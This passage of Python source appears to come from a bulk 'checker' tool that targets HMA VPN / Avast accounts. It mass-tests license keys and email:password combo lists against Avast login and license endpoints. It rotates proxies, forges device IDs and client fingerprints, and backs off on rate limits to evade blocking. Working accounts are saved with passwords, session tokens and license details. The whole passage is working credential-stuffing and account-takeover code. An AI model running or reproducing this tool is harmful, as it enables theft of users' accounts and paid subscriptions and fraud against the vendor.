            Hmakey_safe_write(_hm_invalid_f, full + "\n")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Hmakey_safe_write(_hm_err_f, f"{key} | {et} | {msg}\n")
        if HM_DEBUG and _hm_pbar is not None:
            _hm_pbar.write(f"[{done}/{total}] {key} - err ({et})")

    Hmakey_update_title()


async def Hmakey_bulk_runner(keys):
    Hmakey_verify("bulk_runner")
    queue = asyncio.Queue()
    for k in keys:
        queue.put_nowait(k)

    lock = asyncio.Lock()
    gap = HMAKEY_CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _hm_stop.is_set():
                return
            try:
                key = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _hm_stop.is_set():
                return

            proxy = Hmakey_pick_proxy()
            try:
                result = await Hmakey_run_with_retries(key, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Hmakey_record(key, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {key[:30]}: {e}", flush=True)

            queue.task_done()

    n = max(1, HMAKEY_CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Hmakey_single_check(proxies):
    Hmakey_verify("single_check")
    global _hm_pool, _hm_bad_proxies
    _hm_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    key = input(f"{Eyelifter_color('96', '[*] Enter HMA key (XXXXXX-XXXXXX-XXXXXX): ')}").strip().upper()
    if not KEY_RE.match(key):
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid key format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _hm_pool:
            _hm_pool = list(proxies)
            _hm_bad_proxies = set()
        proxy = Hmakey_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {key}...")
    start = time.time()
    result = asyncio.run(Hmakey_run_with_retries(key, proxy))
    elapsed = time.time() - start

    st = result.get("status", "unknown")
    if st in ("hit", "free", "expired", "invalid"):
        u = result.get("user", {}) or {}
        verdict = {"hit": "PAID", "free": "FREE",
                   "expired": "EXPIRED", "invalid": "INVALID"}.get(st, st)
        rows = [
            ("Status", verdict),
            ("Key", key),
            ("Mode", u.get("mode", "-")),
            ("Plan", u.get("product_name", "-")),
            ("Product ID", u.get("product_id", "-")),
            ("Validity", u.get("product_validity", "-")),
            ("Editions", u.get("product_editions", "-")),
            ("Families", u.get("product_families", "-")),
            ("Features", u.get("features", "-")),
            ("Max Devices", u.get("max_devices", "-")),
            ("Device Used", u.get("device_used", "-")),
            ("Overused", u.get("overused", "-")),
            ("Created", u.get("created", "-")),
            ("Expires", u.get("expires", "-")),
            ("Days Left", str(u.get("days_left", 0))),
            ("Expired", u.get("expired", "-")),
            ("Sale Channel", u.get("sale_channel", "-")),
            ("Sale Type", u.get("sale_type", "-")),
            ("Auto Renew", u.get("billing_auto", "-")),
            ("Next Charge", u.get("next_charge", "-")),
            ("Order ID", u.get("order_id", "-")),
            ("External ID", u.get("external_id", "-")),
            ("Subscription ID", u.get("subscription_id", "-")),
            ("License ID", u.get("id", "-")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", HM_TAG),
        ]
        Eyelifter_summary(rows)
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Hmakey_bulk_check(proxies):
    Hmakey_verify("bulk_check")
    global _hm_total, _hm_hits_f, _hm_expired_f
    global _hm_free_f, _hm_invalid_f, _hm_err_f
    global _hm_folder, _hm_pool, _hm_bad_proxies, _hm_pbar
    Hmakey_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter key file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    keys = Hmakey_extract_keys(content)
    if not keys:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid keys")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(keys)} unique keys")

    os.makedirs(HM_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _hm_folder = os.path.join(HM_DIR, f"Session_{ts}_{rand_tag}")
    os.makedirs(_hm_folder, exist_ok=True)

    _hm_hits_f = open(os.path.join(_hm_folder, "hmakey_hits.txt"), "w", encoding="utf-8")
    _hm_expired_f = open(os.path.join(_hm_folder, "hmakey_expired.txt"), "w", encoding="utf-8")
    _hm_free_f = open(os.path.join(_hm_folder, "hmakey_free.txt"), "w", encoding="utf-8")
    _hm_invalid_f = open(os.path.join(_hm_folder, "hmakey_invalid.txt"), "w", encoding="utf-8")
    _hm_err_f = open(os.path.join(_hm_folder, "hmakey_errors.txt"), "w", encoding="utf-8")

    header = (f"# HMA Key Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {HM_TAG}\n"
              f"# Seal: {HM_SEAL}\n\n")
    for fh in (_hm_hits_f, _hm_expired_f, _hm_free_f, _hm_invalid_f, _hm_err_f):
        fh.write(header)

    _hm_total = len(keys)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_hm_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{HMAKEY_CONFIG['threads']} timeout:{HMAKEY_CONFIG['timeout']}s "
                  f"retries:{HMAKEY_CONFIG['retries']} gap:{HMAKEY_CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies, HMAKEY_CONFIG)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_hm_hits_f, _hm_expired_f, _hm_free_f, _hm_invalid_f, _hm_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _hm_pool = working
        _hm_bad_proxies = set()
    else:
        _hm_pool = []
        _hm_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _hm_stop.clear()
    _hm_pbar = tqdm(
        total=_hm_total,
        desc="checking",
        unit="key",
        ncols=80,
        dynamic_ncols=False,
        leave=True,
    )
    try:
        asyncio.run(Hmakey_bulk_runner(keys))
    except KeyboardInterrupt:
        _hm_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        if _hm_pbar is not None:
            try:
                _hm_pbar.close()
            except Exception:
                pass
            _hm_pbar = None
        for fh in (_hm_hits_f, _hm_expired_f, _hm_free_f, _hm_invalid_f, _hm_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, k in (
        ("hmakey_hits.txt", "hits"),
        ("hmakey_expired.txt", "expired"),
        ("hmakey_free.txt", "free"),
        ("hmakey_invalid.txt", "invalid"),
        ("hmakey_errors.txt", "errors"),
    ):
        old = os.path.join(_hm_folder, base)
        new = os.path.join(_hm_folder, base.replace(".txt", f"_{_hm_stats[k]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_hm_folder}")

    Eyelifter_divider()
    el = time.time() - _hm_start
    Eyelifter_summary([
        ("Total", _hm_total),
        ("Hits (paid)", _hm_stats["hits"]),
        ("Expired", _hm_stats["expired"]),
        ("Free", _hm_stats["free"]),
        ("Invalid", _hm_stats["invalid"]),
        ("Errors", _hm_stats["errors"]),
        ("Rate limited", _hm_stats["rate_limited"]),
        ("Blocks", _hm_stats["blocks"]),
        ("Proxy fails", _hm_stats["proxy_fails"]),
        ("Retries", _hm_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _hm_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Hmakey_settings_menu():
    Hmakey_verify("settings")
    global HM_DEBUG, HM_REQ_TIMEOUT, HM_RATE_LIMIT_BACKOFF, HM_MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {HMAKEY_CONFIG['threads']}")
    print(f"  [2]  Timeout:            {HMAKEY_CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {HMAKEY_CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {HMAKEY_CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {HMAKEY_CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {HMAKEY_CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {HMAKEY_CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {HMAKEY_CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {HMAKEY_CONFIG['skip_proxy_test']}")
    print(f"  [10] Debug:              {HMAKEY_CONFIG['debug']}")
    print(f"  [11] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            HMAKEY_CONFIG["threads"] = max(1, min(200, int(input("Threads (1-200): "))))
            _hm_loader.settings["threads"] = HMAKEY_CONFIG["threads"]
            changed = True
        elif ch == "2":
            HMAKEY_CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _hm_loader.settings["timeout"] = HMAKEY_CONFIG["timeout"]
            HM_REQ_TIMEOUT = HMAKEY_CONFIG["timeout"]
            changed = True
        elif ch == "3":
            HMAKEY_CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _hm_loader.settings["retries"] = HMAKEY_CONFIG["retries"]
            changed = True
        elif ch == "4":
            HMAKEY_CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _hm_loader.settings["retry_delay"] = HMAKEY_CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            HMAKEY_CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _hm_loader.settings["combo_delay"] = HMAKEY_CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            HMAKEY_CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _hm_loader.settings["rate_limit_backoff"] = HMAKEY_CONFIG["rate_limit_backoff"]
            HM_RATE_LIMIT_BACKOFF = HMAKEY_CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            HMAKEY_CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _hm_loader.settings["max_rate_limit_retries"] = HMAKEY_CONFIG["max_rate_limit_retries"]
            HM_MAX_RATE_LIMIT_RETRIES = HMAKEY_CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                HMAKEY_CONFIG["proxies_file"] = v
                _hm_loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            HMAKEY_CONFIG["skip_proxy_test"] = not HMAKEY_CONFIG["skip_proxy_test"]
            _hm_loader.settings["skip_proxy_test"] = HMAKEY_CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            HMAKEY_CONFIG["debug"] = not HMAKEY_CONFIG["debug"]
            _hm_loader.settings["debug"] = HMAKEY_CONFIG["debug"]
            HM_DEBUG = HMAKEY_CONFIG["debug"]
            changed = True
        elif ch == "11":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _hm_loader.save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


_ha_stop = asyncio.Event()
_ha_lock = threading.Lock()
_ha_plock = threading.Lock()
_ha_flock = threading.Lock()

_ha_stats = {
    "checked": 0, "hits": 0, "expired": 0, "free": 0, "not_verified": 0,
    "bad": 0, "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_ha_start = time.time()
_ha_total = 0
_ha_pool = []
_ha_bad_proxies = set()
_ha_hits_f = None
_ha_expired_f = None
_ha_free_f = None
_ha_bad_f = None
_ha_notverified_f = None
_ha_err_f = None
_ha_folder = None
_ha_pbar = None


def Hma_reset_stats():
    Hma_verify("reset_stats")
    global _ha_stats, _ha_start
    with _ha_lock:
        _ha_stats = {
            "checked": 0, "hits": 0, "expired": 0, "free": 0, "not_verified": 0,
            "bad": 0, "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _ha_start = time.time()


def Hma_update_title():
    with _ha_lock:
        checked = _ha_stats["checked"]
        hits = _ha_stats["hits"]
        exp = _ha_stats["expired"]
        free = _ha_stats["free"]
        bad = _ha_stats["bad"]
    el = time.time() - _ha_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{HA_TOOL} | HIT:{hits} EXP:{exp} FREE:{free} BAD:{bad} "
         f"| {checked}/{_ha_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Hma_pick_proxy(exclude=None):
    with _ha_plock:
        avail = [p for p in _ha_pool if p not in _ha_bad_proxies]
        if not avail and _ha_pool:
            _ha_bad_proxies.clear()
            avail = list(_ha_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Hma_mark_bad_proxy(p):
    if not p:
        return
    with _ha_plock:
        _ha_bad_proxies.add(p)
    with _ha_lock:
        _ha_stats["proxy_fails"] += 1


def Hma_safe_write(fh, text):
    if fh is None:
        return
    with _ha_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Hma_gen_device_80():
    return os.urandom(40).hex()


def Hma_gen_device_64():
    return os.urandom(32).hex()


def Hma_gen_app_id():
    return str(uuid.uuid4())


def Hma_compute_digest(app_id, email, password):
    raw = f"{APP_SECRET}{app_id}{email}:{password}".encode()
    return base64.b64encode(hashlib.sha256(raw).digest()).decode()


def Hma_ts_to_date(ms_or_s):
    if not ms_or_s:
        return "N/A", 0, "UNKNOWN"
    try:
        v = float(ms_or_s)
    except Exception:
        return "N/A", 0, "UNKNOWN"
    if v <= 0:
        return "N/A", 0, "UNKNOWN"
    if v > 1e12:
        seconds = v / 1000.0
    elif v > 1e9:
        seconds = v
    else:
        seconds = v
    try:
        dt = datetime.fromtimestamp(seconds, tz=timezone.utc).replace(tzinfo=None)
    except Exception:
        return "N/A", 0, "UNKNOWN"
    delta = (dt - datetime.now(timezone.utc).replace(tzinfo=None)).days
    days_left = max(delta, 0)
    expired = "YES" if delta < 0 else "NO"
    return dt.strftime("%Y-%m-%d"), days_left, expired


def Hma_parse_license(lic):
    if not isinstance(lic, dict):
        return {
            "plan": "N/A", "product_id": "N/A", "maximum": "N/A",
            "overused": "N/A", "expires": "N/A", "expires_iso": "N/A",
            "days_left": 0, "expired": "UNKNOWN", "payment": "N/A",
            "wallet_keys": "N/A", "subscription_id": "N/A",
        }

    product = lic.get("product") or {}
    if not isinstance(product, dict):
        product = {}

    usage = lic.get("licenseUsage") or lic.get("license_usage") or {}
    if not isinstance(usage, dict):
        usage = {}

    sale = lic.get("saleChannel") or lic.get("sale_channel") or {}
    if not isinstance(sale, dict):
        sale = {}

    wk = lic.get("walletKeys") or lic.get("wallet_keys") or []
    if isinstance(wk, list):
        wallet_keys = ",".join(str(x) for x in wk) if wk else "N/A"
    elif wk:
        wallet_keys = str(wk)
    else:
        wallet_keys = "N/A"

    expires = lic.get("expires") or lic.get("expiry") or lic.get("expiration")
    exp_iso, days_left, expired = Hma_ts_to_date(expires)

    return {
        "plan": product.get("name") or lic.get("name") or "N/A",
        "product_id": product.get("id") or lic.get("productId") or "N/A",
        "maximum": usage.get("maximum") or lic.get("maximum") or "N/A",
        "overused": lic.get("overused", "N/A"),
        "expires": expires if expires else "N/A",
        "expires_iso": exp_iso,
        "days_left": days_left,
        "expired": expired,
        "payment": sale.get("id") or lic.get("paymentSystem") or "N/A",
        "wallet_keys": wallet_keys,
        "subscription_id": lic.get("subscriptionId") or lic.get("subscription_id") or "N/A",
    }


def Hma_extract_combos(content):
    Hma_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


class HmaChecker:
    def __init__(self, proxy=None, timeout=None):
        Hma_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or HA_REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None

    def proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def dump(self, label, resp, max_lines=60):
        if not HA_DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more)"))

    async def login(self, email, password):
        app_id = Hma_gen_app_id()
        dev_id = Hma_gen_device_80()
        digest = Hma_compute_digest(app_id, email, password)

        headers = {
            "Host": "my-android.avast.com",
            "Device-Id": dev_id,
            "Device-Platform": DEVICE_PLAT,
            "App-Build-Version": APP_BUILD,
            "App-Id": app_id,
            "App-Ipm-Product": APP_IPM,
            "App-Product-Brand": APP_BRAND,
            "App-Product-Mode": APP_MODE,
            "App-Package-Name": APP_PACKAGE,
            "App-Flavor": APP_FLAVOR,
            "Client-Build-Version": CLIENT_BUILD,
            "Digest": digest,
            "Vaar-Header-Device-Id": dev_id,
            "Vaar-Header-Device-Platform": DEVICE_PLAT,
            "Vaar-Header-App-Build-Version": APP_BUILD,
            "Vaar-Header-App-Id": app_id,
            "Vaar-Header-App-Ipm-Product": APP_IPM,
            "Vaar-Header-App-Product-Brand": APP_BRAND,
            "Vaar-Header-App-Product-Mode": APP_MODE,
            "Vaar-Header-App-Package-Name": APP_PACKAGE,
            "Vaar-Header-App-Flavor": APP_FLAVOR,
            "Vaar-Header-Client-Build-Version": CLIENT_BUILD,
            "Vaar-Header-Content-Type": "application/json",
            "Vaar-Header-Digest": digest,
            "Vaar-Version": "0",
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "User-Agent": UA_LOGIN,
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate",
        }

        payload = {
            "email": email,
            "password": password,
            "requestedTicketTypes": ["LICT", "DEVT"],
        }

        try:
            r = await self.session.post(
                LOGIN_URL, headers=headers, json=payload,
                proxies=self.proxies(), verify=False,
            )
        except Exception as e:
            return None, f"login_net_{type(e).__name__}"

        self.dump("LOGIN", r, 40)

        vaar_status = r.headers.get("vaar-status", "")
        vaar_debug = r.headers.get("vaar-header-status-debug", "")

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"

        if vaar_status == "101" or vaar_debug == "invalid_credentials":
            return {"__bad__": True}, None

        if vaar_status == "102" or vaar_debug == "account_not_verified":
            return {"__not_verified__": True}, None

        if r.status_code != 200:
            return None, f"login_http_{r.status_code}"

        try:
            j = r.json()
        except Exception:
            return None, "login_not_json"

        if not isinstance(j, dict):
            return None, "login_bad_json"

        return j, None

    async def licenses(self, devt):
        dev_id = Hma_gen_device_64()
        headers = {
            "Host": "my-win.avast.com",
            "User-Agent": UA_LIC,
            "Connection": "Keep-Alive",
            "Vaar-Header-App-Build-Version": "9757",
            "Vaar-Header-App-Id": "00000000-0000-0000-0000-000000000000",
            "Vaar-Header-App-IPM-Product": "78",
            "Vaar-Header-App-Product-Brand": "PRIVAX",
            "Vaar-Header-App-Product-Edition": "HMA_VPN_CONSUMER",
            "Vaar-Header-App-Product-Mode": "PAID",
            "Vaar-Header-Auth-Token": devt,
            "Vaar-Header-Device-Id": dev_id,
            "Vaar-Header-Device-Platform": "WIN",
            "Vaar-Version": "0",
            "Content-Length": "0",
        }

        try:
            r = await self.session.post(
                LICENSES_URL, headers=headers, data="",
                proxies=self.proxies(), verify=False,
            )
        except Exception as e:
            return None, f"lic_net_{type(e).__name__}"

        self.dump("LICENSES", r, 60)

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code != 200:
            return None, f"lic_http_{r.status_code}"

        try:
            j = r.json()
        except Exception:
            return None, "lic_not_json"

        return j, None

    async def run(self, email, password):
        await self.ensure()
        try:
            login_json, err = await self.login(email, password)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            if login_json and login_json.get("__bad__"):
                return {"status": "bad", "message": "invalid credentials"}

            if login_json and login_json.get("__not_verified__"):
                return {"status": "not_verified",
                        "user": {
                            "email": email, "password": password,
                            "verified": False,
                        }}

            if not login_json:
                return {"status": "error", "error_type": "no_login_body",
                        "message": "no login body"}

            username = login_json.get("username") or "N/A"
            verified = bool(login_json.get("verified", False))
            uuid_val = login_json.get("uuid") or "N/A"
            email_val = login_json.get("email") or email
            brand_id = login_json.get("brandId")
            fname = login_json.get("firstName")
            lname = login_json.get("lastName")
            shopper_id = login_json.get("shopperId")
            shopper_tok = login_json.get("shopperToken")

            tickets = login_json.get("tickets") or {}
            if not isinstance(tickets, dict):
                tickets = {}

            devt = tickets.get("DEVT")
            lict = tickets.get("LICT")

            if not devt:
                return {"status": "error", "error_type": "no_devt",
                        "message": "no DEVT ticket"}

            lic_json, err = await self.licenses(devt)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            lic_list = []
            if isinstance(lic_json, list):
                lic_list = lic_json
            elif isinstance(lic_json, dict):
                for k in ("data", "licenses", "items", "result", "results"):
                    v = lic_json.get(k)
                    if isinstance(v, list):
                        lic_list = v
                        break
                if not lic_list:
                    lic_list = [lic_json]

            u = {
                "email": email_val,
                "password": password,
                "username": username,
                "verified": verified,
                "uuid": uuid_val,
                "brand_id": brand_id,
                "first_name": fname,
                "last_name": lname,
                "shopper_id": shopper_id,
                "shopper_token": shopper_tok,
                "lic_ticket": lict,
                "devt_ticket": devt,
                "lic_count": len(lic_list),
                "plan": "N/A",
                "product_id": "N/A",
                "maximum": "N/A",
                "overused": "N/A",
                "expires": "N/A",
                "expires_iso": "N/A",
                "days_left": 0,
                "expired": "UNKNOWN",
                "payment": "N/A",
                "wallet_keys": "N/A",
                "subscription_id": "N/A",
            }

            if lic_list:
                parsed = Hma_parse_license(lic_list[0])
                u.update(parsed)

                if parsed["expired"] == "YES":
                    return {"status": "expired", "user": u}
                if parsed["expired"] == "NO":
                    return {"status": "hit", "user": u}
                return {"status": "hit", "user": u}

            return {"status": "free", "user": u}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.close()


def Hma_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "free": "FREE", "expired": "EXPIRED",
           "not_verified": "NOTVERIFIED"}.get(status, "?")

    fields = [
        ("Plan",         u.get("plan") if u.get("plan") != "N/A" else None),
        ("ProductID",    u.get("product_id") if u.get("product_id") != "N/A" else None),
        ("MaxDevices",   u.get("maximum") if u.get("maximum") != "N/A" else None),
        ("Overused",     str(u.get("overused")) if u.get("overused") not in (None, "N/A") else None),
        ("Expires",      u.get("expires_iso") if u.get("expires_iso") != "N/A" else None),
        ("DaysLeft",     str(u.get("days_left")) if u.get("days_left") else None),
        ("Expired",      u.get("expired") if u.get("expired") not in (None, "UNKNOWN") else None),
        ("Payment",      u.get("payment") if u.get("payment") != "N/A" else None),
        ("SubID",        u.get("subscription_id") if u.get("subscription_id") != "N/A" else None),
        ("Username",     u.get("username") if u.get("username") != "N/A" else None),
        ("Verified",     "Yes" if u.get("verified") else None),
        ("UUID",         u.get("uuid") if u.get("uuid") != "N/A" else None),
        ("WalletKeys",   u.get("wallet_keys") if u.get("wallet_keys") != "N/A" else None),
    ]

    parts = []
    for label, value in fields:
        if value is None:
            continue
        value = str(value).strip()
        if not value or value == "-":
            continue
        parts.append(f"{label} = {value}")

    parts.append(f"by {HA_TAG}")
    return f"{tag} {combo} | " + " | ".join(parts)


async def Hma_run_with_retries(combo, proxy):
    Hma_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = HMA_CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _ha_stop.is_set():
            break
        if attempt > 0:
            np = Hma_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = await HmaChecker(proxy=proxy).run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "expired", "bad", "not_verified"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _ha_lock:
                _ha_stats["rate_limited"] += 1
                if not is_last:
                    _ha_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > HA_MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(HA_RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Hma_mark_bad_proxy(proxy)
            continue

        if et == "block":
            with _ha_lock:
                _ha_stats["blocks"] += 1
                if not is_last:
                    _ha_stats["retries"] += 1
            if proxy:
                Hma_mark_bad_proxy(proxy)
            await asyncio.sleep(1)
            continue

        if et.startswith(("login_net_", "lic_net_")):
            if not is_last:
                with _ha_lock:
                    _ha_stats["retries"] += 1
            if proxy:
                Hma_mark_bad_proxy(proxy)
            await asyncio.sleep(HMA_CONFIG.get("retry_delay", 1.5))
            continue

        if not is_last:
            with _ha_lock:
                _ha_stats["retries"] += 1
        await asyncio.sleep(HMA_CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Hma_record(combo, result):
    Hma_verify("record")
    global _ha_hits_f, _ha_expired_f, _ha_free_f
    global _ha_bad_f, _ha_notverified_f, _ha_err_f, _ha_pbar
    st = result.get("status", "unknown")

    with _ha_lock:
        _ha_stats["checked"] += 1
        done = _ha_stats["checked"]
        if st == "hit":
            _ha_stats["hits"] += 1
        elif st == "expired":
            _ha_stats["expired"] += 1
        elif st == "free":
            _ha_stats["free"] += 1
        elif st == "not_verified":
            _ha_stats["not_verified"] += 1
        elif st == "bad":
            _ha_stats["bad"] += 1
        else:
            _ha_stats["errors"] += 1

    total = _ha_total

    if _ha_pbar is not None:
        try:
            _ha_pbar.update(1)
            _ha_pbar.set_postfix_str(
                f"H:{_ha_stats['hits']} "
                f"E:{_ha_stats['expired']} "
                f"F:{_ha_stats['free']} "
                f"N:{_ha_stats['not_verified']} "
                f"B:{_ha_stats['bad']} "
                f"X:{_ha_stats['errors']}",
                refresh=True,
            )
        except Exception:
            pass

    if st in ("hit", "free", "expired", "not_verified"):
        u = result.get("user", {}) or {}
        full = Hma_fmt_line(combo, u, st)
        if st == "hit":
            line = f"\n[{done}/{total}] {Eyelifter_color('32', full, True)}\n"
            if _ha_pbar is not None:
                _ha_pbar.write(line)
            else:
                print(line)
            Hma_safe_write(_ha_hits_f, full + "\n\n")
        elif st == "expired":
            Hma_safe_write(_ha_expired_f, full + "\n\n")
        elif st == "not_verified":
            Hma_safe_write(_ha_notverified_f, full + "\n\n")
        else:
            Hma_safe_write(_ha_free_f, full + "\n\n")
    elif st == "bad":
        Hma_safe_write(_ha_bad_f, f"{combo} | invalid credentials\n")
        if HA_DEBUG and _ha_pbar is not None:
            _ha_pbar.write(f"[{done}/{total}] {combo.split(':')[0]} - bad")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Hma_safe_write(_ha_err_f, f"{combo} | {et} | {msg}\n")
        if HA_DEBUG and _ha_pbar is not None:
            _ha_pbar.write(f"[{done}/{total}] {combo.split(':')[0]} - err ({et})")

    Hma_update_title()


async def Hma_bulk_runner(combos):
    Hma_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

